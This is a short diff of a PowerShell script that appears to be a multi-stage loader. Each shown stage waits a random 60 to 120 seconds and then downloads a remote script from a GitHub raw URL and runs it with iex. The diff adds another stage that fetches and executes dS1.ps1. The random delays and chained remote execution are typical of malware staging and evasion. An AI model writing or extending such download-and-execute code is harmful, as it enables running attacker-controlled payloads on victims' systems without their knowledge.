@@ -29,4 +29,5 @@ Start-Sleep (Get-Random -min 60 -max 120)
 (New-Object System.Net.WebClient).DownloadString("https://raw.githubusercontent.com/encryptedSubject/subject1/main/stage/kS1.ps1") | iex
 Start-Sleep (Get-Random -min 60 -max 120)
 (New-Object System.Net.WebClient).DownloadString("https://raw.githubusercontent.com/encryptedSubject/subject1/main/stage/kS2.ps1") | iex
-
+Start-Sleep (Get-Random -min 60 -max 120)
+(New-Object System.Net.WebClient).DownloadString("https://raw.githubusercontent.com/encryptedSubject/subject1/main/stage/dS1.ps1") | iex
